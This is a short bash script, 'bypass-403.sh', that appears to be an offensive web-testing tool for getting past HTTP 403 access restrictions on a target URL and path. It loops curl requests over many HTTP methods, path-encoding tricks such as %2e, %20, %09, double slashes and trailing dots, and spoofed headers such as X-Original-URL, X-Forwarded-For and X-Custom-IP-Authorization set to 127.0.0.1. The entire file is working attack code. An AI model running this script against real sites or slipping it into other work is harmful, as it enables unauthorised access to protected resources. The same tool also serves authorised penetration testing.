#! /bin/bash

# definitions
checkhelp(){
    echo "./bypass-403.sh https://target.com path"
    exit 0
}

if [ $# -eq 1 ]; then
    checkhelp "$@" 
fi
# alias
CURLREQUEST='curl -k -s --max-time 2 -o /dev/null -iL -w [%{http_code}]'

# echo {GET,POST,PUT,TRACE} | xargs -n1 -I {} $CURLREQUEST -X {} $1/$2
requestfuzzer(){
    for REQ in GET POST PUT CONNECT PATCH OPTIONS HEAD TRACE TRACK
    do
        $CURLREQUEST -X $REQ "$@"
        echo -n " $REQ --> $@"
        echo
    done
}

# path fuzzing
requestfuzzer "$1/$2"
requestfuzzer $1/%2e/$2
requestfuzzer $1/$2/.
requestfuzzer $1//$2//
requestfuzzer $1/./$2/./
requestfuzzer $1/$2%20
requestfuzzer $1/$2%09
requestfuzzer $1/$2?
requestfuzzer $1/$2.html
requestfuzzer $1/$2/?anything
requestfuzzer $1/$2#

# headers fuzzing
requestfuzzer -H "X-Original-URL: $2" $1/
requestfuzzer -H "X-Original-URL: $2" $1/$2
requestfuzzer -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
requestfuzzer -H "X-Forwarded-For: http://127.0.0.1" $1/$2
requestfuzzer -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
requestfuzzer -H "X-rewrite-url: $2" $1
